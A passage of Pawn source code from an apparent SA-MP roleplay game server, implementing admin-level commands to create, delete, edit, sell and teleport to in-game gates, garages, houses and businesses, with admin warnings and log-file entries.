		Log("Log/Players/gates.log", string);
	}
	else
	{
		format(string, sizeof(string), "* Administrator %s has made you an owner of gate ID %d.", GetName(playerid), idx, slot);
		SendClientMessage(user, COLOR_WHITE, string);
		format(string, sizeof(string), "AdminWarning: %s has made %s an owner of gate ID %d. (Slot %d)", GetName(playerid), GetName(user), idx, slot);
		SendAdminMessage(COLOR_ADMWARN,  string);
		Log("Log/Players/gates.log", string);
	}
	return 1;
}
IRP:deletegate(playerid, var[])
{
	new idx, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deletegate [gateid]");
	if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid gate id.");
	GateInfo[idx][gModel] = 0;
	GateInfo[idx][gCX] = 0;
	GateInfo[idx][gCY] = 0;
	GateInfo[idx][gCZ] = 0;
	GateInfo[idx][gCRX] = 0;
	GateInfo[idx][gCRY] = 0;
	GateInfo[idx][gCRZ] = 0;
	GateInfo[idx][gOX] = 0;
	GateInfo[idx][gOY] = 0;
	GateInfo[idx][gOZ] = 0;
	GateInfo[idx][gORX] = 0;
	GateInfo[idx][gORY] = 0;
	GateInfo[idx][gORZ] = 0;
	GateInfo[idx][gStatus] = 0;
	format(GateInfo[idx][gPassword], 256, "");
	GateInfo[idx][gSpeed] = 0;
	DestroyDynamicObject(GateInfo[idx][gGate]);
	DestroyDynamic3DTextLabel(GateInfo[idx][gText]);
	format(string, sizeof(string), "AdminWarning: %s has deleted gate ID %d.", GetName(playerid), idx);
    SendAdminMessage(COLOR_ADMWARN, string);
	Log("Log/Admins/gates.log", string);
	foreach(Player, i)
	{
		if(Player[i][pGate][0] == idx)
		{
		    Player[i][pGate][0] = 0;
		    SendClientMessage(playerid, COLOR_WHITE, "* An administrator has deleted your gate in slot 1.");
		    format(string, sizeof(string), "AdminWarning: %s has deleted %s's slot 1 gate. (ID: %d)", GetName(playerid), GetName(i), idx);
		    SendAdminMessage(COLOR_ADMWARN, string);
			Log("Log/Admins/gates.log", string);
		}
		if(Player[i][pGate][1] == idx)
		{
		    Player[i][pGate][1] = 0;
		    SendClientMessage(playerid, COLOR_WHITE, "* An administrator has deleted your gate in slot 2.");
		    format(string, sizeof(string), "AdminWarning: %s has deleted %s's slot 2 gate. (ID: %d)", GetName(playerid), GetName(i), idx);
		    SendAdminMessage(COLOR_ADMWARN, string);
			Log("Log/Admins/gates.log", string);
		}
		if(Player[i][pGate][2] == idx)
		{
		    Player[i][pGate][2] = 0;
		    SendClientMessage(playerid, COLOR_WHITE, "* An administrator has deleted your gate in slot 3.");
		    format(string, sizeof(string), "AdminWarning: %s has deleted %s's slot 3 gate. (ID: %d)", GetName(playerid), GetName(i), idx);
		    SendAdminMessage(COLOR_ADMWARN, string);
			Log("Log/Admins/gates.log", string);
		}
	}
	return 1;
}
IRP:creategate(playerid, var[])
{
	new string[128], object;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "i", object)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /creategate [gateid]");
	for(new idx=1; idx<MAX_GATES; idx++)
	{
	    if(!GateInfo[idx][gModel])
	    {
	        GetPlayerPos(playerid, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ]);
  			GateInfo[idx][gModel] = object;
			GateInfo[idx][gCX] = GateInfo[idx][gCX] + 2;
			GateInfo[idx][gCY] = GateInfo[idx][gCY] + 2;
			GateInfo[idx][gCRX] = 0;
			GateInfo[idx][gCRY] = 0;
			GateInfo[idx][gCRZ] = 0;
			GetPlayerPos(playerid, GateInfo[idx][gOX], GateInfo[idx][gOY], GateInfo[idx][gOZ]);
			GateInfo[idx][gOX] = GateInfo[idx][gOX] + 2;
			GateInfo[idx][gOY] = GateInfo[idx][gOY] + 2;
			GateInfo[idx][gORX] = 0;
			GateInfo[idx][gORY] = 0;
			GateInfo[idx][gORZ] = 0;
			GateInfo[idx][gStatus] = 0;
			format(GateInfo[idx][gPassword], 256, "");
			GateInfo[idx][gSpeed] = 2;
			// Creating
			GateInfo[idx][gGate] = CreateDynamicObject(GateInfo[idx][gModel], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
			GateInfo[idx][gText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], 10);
			// Text
			format(string, sizeof(string), "AdminWarning: %s has created gate ID %d. (Gate ID: %d)", GetName(playerid), idx, object);
		    SendAdminMessage(COLOR_ADMWARN, string);
			Log("Log/Admins/gates.log", string);
			idx = MAX_GATES;
		}
	}
	return 1;
}
IRP:getgateid(playerid, var[])
{
    new string[256];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
    for(new idx=1; idx<MAX_GATES; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ]))
		{
		    format(string, sizeof(string), "Gate ID: %d", idx);
		    SendClientMessage(playerid, COLOR_SCRIPTER, string);
		    return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "You are not near a gare.");
	return 1;
}
IRP:creategarage(playerid, var[])
{
	new string[256];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
	for(new idx=1; idx<MAX_GARAGES; idx++)
	{
	    if(!GarageInfo[idx][gLevel])
		{
		    // Getting Business Setup
		    new Float:X, Float:Y, Float:Z;
		    GetPlayerPos(playerid, X, Y, Z);
		    // Making Business
		    GarageInfo[idx][gLevel] = 1;
		    GarageInfo[idx][gPrice] = 150000;
		    GarageInfo[idx][gStatus] = 0;
		    format(GarageInfo[idx][gOwner], 32, "The State");
		    GarageInfo[idx][gX] = X;
		    GarageInfo[idx][gY] = Y;
		    GarageInfo[idx][gZ] = Z;
		    GarageInfo[idx][gPickup] = CreateDynamicPickup(1318, 1, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ], 0);
            format(string, sizeof(string), "Garage Size: %s\nStatus: For Sale\nPrice: $%d", GT(idx), GarageInfo[idx][gPrice]);
			GarageInfo[idx][gText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]+0.3, 15);
			format(string, sizeof(string), "AdminWarning: %s has created garage ID %d.", GetName(playerid), idx);
            SendAdminMessage(COLOR_ADMWARN, string);
 			Log("Log/Admins/garage.log", string);
			idx = MAX_GARAGES;
		}
	}
	return 1;
}

IRP:deletegarage(playerid, var[])
{
	new id, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
	if(sscanf(var, "i", id)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deletegarage [garageid]");
	if(!GarageInfo[id][gLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "You are entering an invalid garage id.");
    foreach(Player, i)
	{
	    if(Logged(i) && Player[i][pGarage] == id)
		{
		    Player[i][pGarage] = 0;
		    format(string, sizeof(string), " Administrator %s has deleted your garage.", GetName(playerid));
			SendClientMessage(i, COLOR_WHITE, string);
		}
	}
	if(!strcmp("The State", GarageInfo[id][gOwner]))
	{
		format(string, sizeof(string), "AdminWarning: %s has deleted garage ID %d.", GetName(playerid), id);
	}
	else
	{
	    format(string, sizeof(string), "AdminWarning: %s has deleted %s's garage. (ID %d)", GetName(playerid), GarageInfo[id][gOwner], id);
	}
    SendAdminMessage(COLOR_ADMWARN, string);
	Log("Log/Admins/garage.log", string);
	GarageInfo[id][gLevel] = 0;
    GarageInfo[id][gPrice] = 0;
    GarageInfo[id][gStatus] = 0;
    format(GarageInfo[id][gOwner], 32, "");
    GarageInfo[id][gX] = 0;
    GarageInfo[id][gY] = 0;
    GarageInfo[id][gZ] = 0;
    DestroyDynamicPickup(GarageInfo[id][gPickup]);
    DestroyDynamic3DTextLabel(GarageInfo[id][gText]);
	return 1;
}

IRP:gotogarage(playerid, var[])
{
    new idx, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gotogarage [garageid]");
    if(!GarageInfo[idx][gLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "You are entering an invalid garage id.");
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	SetPlayerPos(playerid, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
	format(string, sizeof(string), "* You have teleported to garage ID %d.", idx);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}


IRP:editgarage(playerid, var[])
{
	new bizid, string[128], input;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
	if(sscanf(var, "s[32]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editgarage [option] [garageid]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: location | price");
		return 1;
	}
	if(!strcmp(var, "location", true, 8))
	{
	    if(sscanf(var, "s[32]i", var, bizid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editgarage location [garage]");
        new idx = bizid;
        if(!GarageInfo[bizid][gLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid garage id.");
		GetPlayerPos(playerid, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
		DestroyDynamicPickup(GarageInfo[idx][gPickup]);
    	GarageInfo[idx][gPickup] = CreateDynamicPickup(1318, 1, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ], 0);
		DestroyDynamic3DTextLabel(GarageInfo[idx][gText]);
        if(!strcmp("The State", GarageInfo[idx][gOwner])) format(string, sizeof(string), "Garage Size: %s\nStatus: For Sale\nPrice: $%d", GT(idx), GarageInfo[idx][gPrice]);
		else format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
		GarageInfo[idx][gText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]+0.3, 15);
	    format(string, sizeof(string), "AdminWarning: %s has changed garage ID %d's location.", GetName(playerid), bizid);
        SendAdminMessage(COLOR_ADMWARN, string);
		Log("Log/Admins/garage.log", string);
	}
	else if(!strcmp(var, "price", true, 5))
	{
	    if(sscanf(var, "s[32]ii", var, bizid, input)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editgarage price [garage] [price]");
        new idx = bizid;
		if(!GarageInfo[idx][gLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid garage id.");
		if(strcmp("The State", GarageInfo[bizid][gOwner])) return SendClientMessage(playerid, COLOR_GRAD2, "You can't edit the price of owned garages.");
	    GarageInfo[bizid][gPrice] = input;
	    format(string, sizeof(string), "Garage Size: %s\nStatus: For Sale\nPrice: $%d", GT(bizid), input);
		UpdateDynamic3DTextLabelText(GarageInfo[bizid][gText], COLOR_WHITE, string);
	    format(string, sizeof(string), "AdminWarning: %s has set garage ID %d's price to $%d.", GetName(playerid), bizid, input);
        SendAdminMessage(COLOR_ADMWARN, string);
		Log("Log/Admins/garage.log", string);
	}
	return 1;
}
IRP:getgarageid(playerid, var[])
{
    new string[256];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
    for(new idx=1; idx<MAX_GARAGES; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]))
		{
		    format(string, sizeof(string), "Garage ID: %d", idx);
		    SendClientMessage(playerid, COLOR_SCRIPTER, string);
		    return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "You are not near a garage.");
	return 1;
}
IRP:getbizid(playerid, var[])
{
    new string[256];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
        for(new idx=1; idx<MAX_BIZ; idx++)
    	{
    		if(IsPlayerInRangeOfPoint(playerid, 3, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]))
    		{
    		    format(string, sizeof(string), "Business ID: %d", idx);
	    	    SendClientMessage(playerid, COLOR_SCRIPTER, string);
		        return 1;
    		}
    	}
    	SendClientMessage(playerid, COLOR_GRAD2, "You are not near a business.");
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:gethouseid(playerid, var[])
{
    new string[256];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
        for(new idx=1; idx<MAX_HOUSES; idx++)
    	{
    		if(IsPlayerInRangeOfPoint(playerid, 3, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]))
     		{
    		    format(string, sizeof(string), "House ID: %d", idx);
    		    SendClientMessage(playerid, COLOR_SCRIPTER, string);
    		    return 1;
    		}
    	}
    	SendClientMessage(playerid, COLOR_GRAD2, "You are not near a house.");
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:hused(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
	SendClientMessage(playerid, COLOR_INT, "[Used Houses]:");
	for(new idx=1; idx<MAX_HOUSES; idx++)
	{
	    if(HouseInfo[idx][hLevel])
	    {
			format(string, sizeof(string), "* ID: %d | Level: %d (%s) | Price: $%d | Money: $%d | Owner: %s",
			idx, HouseInfo[idx][hLevel], HT(idx), HouseInfo[idx][hPrice], HouseInfo[idx][hMoney], HouseInfo[idx][hOwner]);
			SendClientMessage(playerid, COLOR_WHITE, string);
	    }
	}
	return 1;
}
IRP:createhouse(playerid, var[])
{
	new string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	for(new idx=1; idx<MAX_HOUSES; idx++)
    	{
     	    if(!HouseInfo[idx][hLevel])
     		{
	    	    // Getting House Setup
		        new Float:X, Float:Y, Float:Z;
	     	    GetPlayerPos(playerid, X, Y, Z);
		        // Creating the House
	      	    HouseInfo[idx][hLevel] = 1;
	     	    HouseInfo[idx][hPrice] = 200000;
	    	    HouseInfo[idx][hStatus] = 0;
	    	    format(HouseInfo[idx][hOwner], 32, "The State");
	     	    HouseInfo[idx][hX] = X;
		        HouseInfo[idx][hY] = Y;
    		    HouseInfo[idx][hZ] = Z;
	     	    HouseInfo[idx][hMoney] = 0;
    		    HouseInfo[idx][hMaterials] = 0;
	    	    HouseInfo[idx][hWeed] = 0;
	    	    HouseInfo[idx][hcocaine] = 0;
	    		HouseInfo[idx][hGun][0] = 0;
		    	HouseInfo[idx][hGunAmmo][0] = 0;
		    	HouseInfo[idx][hGun][1] = 0;
		    	HouseInfo[idx][hGunAmmo][1] = 0;
		    	HouseInfo[idx][hGun][2] = 0;
		    	HouseInfo[idx][hGunAmmo][2] = 0;
		     	HouseInfo[idx][hGun][3] = 0;
		    	HouseInfo[idx][hGunAmmo][3] = 0;
	    		HouseInfo[idx][hGun][4] = 0;
		    	HouseInfo[idx][hGunAmmo][4] = 0;
	    	    HouseInfo[idx][hPickup] = CreateDynamicPickup(1273, 1, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ], 0);
                format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: For Sale\nHouse Price:$%d", HouseInfo[idx][hOwner], HT(idx), HouseInfo[idx][hPrice]);
	    		HouseInfo[idx][hText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]+0.5, 15);
	    		format(string, sizeof(string), "AdminWarning: %s has successfully created a house. (House ID: %d)", GetName(playerid), idx);
	    		SendAdminMessage(COLOR_ADMWARN,  string);
    			Log("Log/Admins/house.log", string);
	    		idx = MAX_HOUSES;
	    	}
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:asellhouse(playerid, var[])
{
	new houseid, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
	if(sscanf(var, "i", houseid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /asellhouse [houseid]");
	if(!HouseInfo[houseid][hLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering invalid house id.");
	if(!strcmp("The State", HouseInfo[houseid][hOwner], true)) return SendClientMessage(playerid, COLOR_GRAD2, "This house is not owned by anybody.");
	foreach(Player, i)
	{
	    if(Logged(i) && Player[i][pHouse] == houseid)
		{
			Player[i][pHouse] = 0;
			format(string, sizeof(string), "* Administrator %s has sold your house.", GetName(playerid));
			SendClientMessage(i, COLOR_WHITE, string);
		}
	}
	format(string, sizeof(string), "AdminWarning: %s has sold %s's house. (ID %d)", GetName(playerid), HouseInfo[houseid][hOwner], houseid);
	SendAdminMessage(COLOR_ADMWARN, string);
	Log("Log/Admins/house.log", string);
    HouseInfo[houseid][hStatus] = 0;
	HouseInfo[houseid][hLevel] = 1;
    HouseInfo[houseid][hPrice] = 200000;
    HouseInfo[houseid][hMoney] = 0;
    HouseInfo[houseid][hMaterials] = 0;
    HouseInfo[houseid][hWeed] = 0;
    HouseInfo[houseid][hSeed] = 0;
    HouseInfo[houseid][hcocaine] = 0;
	HouseInfo[houseid][hGun][0] = 0;
   	HouseInfo[houseid][hGunAmmo][0] = 0;
   	HouseInfo[houseid][hGun][1] = 0;
   	HouseInfo[houseid][hGunAmmo][1] = 0;
   	HouseInfo[houseid][hGun][2] = 0;
   	HouseInfo[houseid][hGunAmmo][2] = 0;
   	HouseInfo[houseid][hGun][3] = 0;
   	HouseInfo[houseid][hGunAmmo][3] = 0;
	HouseInfo[houseid][hGun][4] = 0;
   	HouseInfo[houseid][hGunAmmo][4] = 0;
    format(HouseInfo[houseid][hOwner], 32, "The State");
    format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: For Sale\nHouse Price:$%d", HouseInfo[houseid][hOwner], HT(houseid), HouseInfo[houseid][hPrice]);
	UpdateDynamic3DTextLabelText(HouseInfo[houseid][hText], COLOR_WHITE, string);
	return 1;
}
IRP:deletehouse(playerid, var[])
{
	new id, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "i", id)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deletehouse [houseid]");
    	if(!HouseInfo[id][hLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "That house ID is not found in the database.");
        foreach(Player, i)
    	{
    	    if(Logged(i) && Player[i][pHouse] == id)
	    	{
	       	    Player[i][pHouse] = 0;
	    	    format(string, sizeof(string), "* Your house has been deleted by an administrator.");
		    	SendClientMessage(i, COLOR_WHITE, string);
	    	}
    	}
    	if(!strcmp("The State", HouseInfo[id][hOwner]))
    	{
    		format(string, sizeof(string), "AdminWarning: %s has successfully deleted a house. (House ID: %d)", GetName(playerid), id);
    	}
    	else
    	{
	        format(string, sizeof(string), "AdminWarning: %s's house has been successfully deleted by %s. (House ID %d)", HouseInfo[id][hOwner], GetName(playerid), id);
    	}
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/house.log", string);
    	HouseInfo[id][hLevel] = 0;
        HouseInfo[id][hPrice] = 0;
        HouseInfo[id][hStatus] = 0;
        format(HouseInfo[id][hOwner], 32, "");
        HouseInfo[id][hX] = 0;
        HouseInfo[id][hY] = 0;
        HouseInfo[id][hZ] = 0;
        HouseInfo[id][hMoney] = 0;
        HouseInfo[id][hMaterials] = 0;
        HouseInfo[id][hWeed] = 0;
        HouseInfo[id][hcocaine] = 0;
     	HouseInfo[id][hGun][0] = 0;
    	HouseInfo[id][hGunAmmo][0] = 0;
    	HouseInfo[id][hGun][1] = 0;
    	HouseInfo[id][hGunAmmo][1] = 0;
    	HouseInfo[id][hGun][2] = 0;
    	HouseInfo[id][hGunAmmo][2] = 0;
    	HouseInfo[id][hGun][3] = 0;
    	HouseInfo[id][hGunAmmo][3] = 0;
    	HouseInfo[id][hGun][4] = 0;
    	HouseInfo[id][hGunAmmo][4] = 0;
        DestroyDynamicPickup(HouseInfo[id][hPickup]);
        DestroyDynamic3DTextLabel(HouseInfo[id][hText]);
	}
	else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:gotohouse(playerid, var[])
{
    new idx, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gotohouse [houseid]");
    	if(!HouseInfo[idx][hLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "That house ID is not found in the database.");
    	SetPlayerVirtualWorld(playerid, 0);
    	SetPlayerInterior(playerid, 0);
    	SetPlayerPos(playerid, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]);
    	format(string, sizeof(string), "* You have successfuly teleported to a house. (House ID: %d)", idx);
    	SendClientMessage(playerid, COLOR_WHITE, string);
    	Log("Log/Admins/house.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}



IRP:edithouse(playerid, var[])
{
	new houseid, string[128], input;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "s[32]", var))
    	{
    		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /edithouse [option] [houseid]");
    		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: location | price | level");
    		return 1;
    	}
    	if(!strcmp(var, "location", true, 8))
    	{
    	    if(sscanf(var, "s[32]i", var, houseid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /edithouse location [houseid]");
            new idx = houseid;
            if(!HouseInfo[houseid][hLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "That house ID is not found in the database.");
    		GetPlayerPos(playerid, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]);
	    	DestroyDynamicPickup(HouseInfo[idx][hPickup]);
         	HouseInfo[idx][hPickup] = CreateDynamicPickup(1273, 1, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ], 0);
	    	DestroyDynamic3DTextLabel(HouseInfo[idx][hText]);
	    	if(!strcmp("The State", HouseInfo[idx][hOwner])) format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: For Sale\nHouse Price:$%d", HouseInfo[idx][hOwner], HT(idx), HouseInfo[idx][hPrice]);
			else format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
    		HouseInfo[idx][hText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]+0.5, 15);
	        format(string, sizeof(string), "AdminWarning: %s has successfully adjusted house ID %d's location.", GetName(playerid), houseid);
	    	SendAdminMessage(COLOR_ADMWARN,  string);
	    	Log("Log/Admins/house.log", string);
    	}
    	else if(!strcmp(var, "price", true, 5))
    	{
    	    if(sscanf(var, "s[32]ii", var, houseid, input)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /edithouse price [houseid] [price]");
            new idx = houseid;
    		if(!HouseInfo[idx][hLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "That house ID is not found in the database.");
	     	if(strcmp("The State", HouseInfo[houseid][hOwner])) return SendClientMessage(playerid, COLOR_GRAD2, "You're not able to complete this action, an error ocurred.");
     	    HouseInfo[houseid][hPrice] = input;
	        format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: For Sale\nHouse Price:$%d", HouseInfo[idx][hOwner], HT(idx), HouseInfo[idx][hPrice]);
    		UpdateDynamic3DTextLabelText(HouseInfo[houseid][hText], COLOR_WHITE, string);
    	    format(string, sizeof(string), "AdminWarning: %s has successfully adjusted house ID %d's price to $%d.", GetName(playerid), houseid, input);
	    	SendAdminMessage(COLOR_ADMWARN,  string);
    		Log("Log/Admins/house.log", string);
    	}
    	else if(!strcmp(var, "level", true, 5))
    	{
    	    if(sscanf(var, "s[32]ii", var, houseid, input)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /edithouse level [houseid] [level]");
            new idx = houseid;
        	if(!HouseInfo[idx][hLevel]) return SendClientMessage(playerid, COLOR_GRAD2, "That house ID is not found in the database.");
        	if(input < 1 || input > 11) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid house level.");
    	    HouseInfo[houseid][hLevel] = input;
            if(!strcmp("The State", HouseInfo[idx][hOwner])) format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: For Sale\nHouse Price:$%d", HouseInfo[idx][hOwner], HT(idx), HouseInfo[idx][hPrice]);
			else format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
	     	UpdateDynamic3DTextLabelText(HouseInfo[houseid][hText], COLOR_WHITE, string);
	        format(string, sizeof(string), "AdminWarning: %s has successfully adjusted house ID %d's level to %d.", GetName(playerid), houseid, input);
	    	SendAdminMessage(COLOR_ADMWARN,  string);
	    	Log("Log/Admins/house.log", string);
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:bizused(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
	SendClientMessage(playerid, COLOR_INT, "[Used Businesses]:");
	for(new idx=1; idx<MAX_BIZ; idx++)
	{
	    if(BizInfo[idx][bType])
	    {
			format(string, sizeof(string), "* ID: %d | Type: %s | Level: %d | Price: $%d | Products: %d | Vault: $%d | Owner: %s", idx, RBT(idx), BizInfo[idx][bLevel], BizInfo[idx][bPrice],BizInfo[idx][bProducts], BizInfo[idx][bMoney], BizInfo[idx][bOwner]);
			SendClientMessage(playerid, COLOR_WHITE, string);
	    }
	}
	return 1;
}
IRP:createbiz(playerid, var[])
{
	new type, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "i", type))
    	{
    		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createbiz [type]");
	    	SendClientMessage(playerid, COLOR_GRAD2, "** [TYPES]: 1) Market | 2) Clothes Shop | 3) Ammunation | 4) Club | 5) Advertisement Agency | 6) Fast Food");
	    	return 1;
    	}
    	if(type < 1 || type > 6) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid business type ID.");
    	for(new idx=1; idx<MAX_BIZ; idx++)
    	{
    	    if(!BizInfo[idx][bType])
    		{
	    	    // Getting Business Setup
	    	    new Float:X, Float:Y, Float:Z;
	    	    GetPlayerPos(playerid, X, Y, Z);
	    	    // Making Business
		        BizInfo[idx][bType] = type;
	    	    BizInfo[idx][bStatus] = 0;
	     	    format(BizInfo[idx][bOwner], 32, "The State");
 	    	    BizInfo[idx][bX] = X;
    		    BizInfo[idx][bY] = Y;
    		    BizInfo[idx][bZ] = Z;
	     	    BizInfo[idx][bMoney] = 0;
	    	    BizInfo[idx][bProducts] = 0;
	    	    BizInfo[idx][bSold] = 0;
	    	    BizInfo[idx][bLevel] = 1;
	    	    BizInfo[idx][bPrice] = 750000;
	    		BizInfo[idx][bPickup] = CreateDynamicPickup(1272, 1, X, Y, Z, 0);
	    		format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: For Sale\nBusiness Price: $%d", RBT(idx), BizInfo[idx][bOwner], BizInfo[idx][bPrice]);
	    		BizInfo[idx][bText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, X, Y, Z+0.5, 15);
	    		format(string, sizeof(string), "AdminWarning: %s has created business ID %d.", GetName(playerid), idx);
	    		SendAdminMessage(COLOR_ADMWARN,  string);
	    		Log("Log/Admins/business.log", string);
    			idx = MAX_BIZ;
    		}
    	}
    }
    else
    {
		NoAuth(playerid);
	}
   	return 1;
}
IRP:asellbiz(playerid, var[])
{
	new bizid, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
	if(sscanf(var, "i", bizid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /asellbiz [bizid]");
	if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering invalid biz id.");
	if(!strcmp("The State", BizInfo[bizid][bOwner], true)) return SendClientMessage(playerid, COLOR_GRAD2, "This business is not owned by anybody.");
	foreach(Player, i)
	{
	    if(Logged(i) && Player[i][pBiz] == bizid)
		{
			Player[i][pBiz] = 0;
			format(string, sizeof(string), " Administrator %s has sold your business.", GetName(playerid));
			SendClientMessage(i, COLOR_WHITE, string);
		}
	}
	format(string, sizeof(string), "AdminWarning: %s has sold %s's business. (ID %d)", GetName(playerid), BizInfo[bizid][bOwner], bizid);
	SendAdminMessage(COLOR_ADMWARN, string);
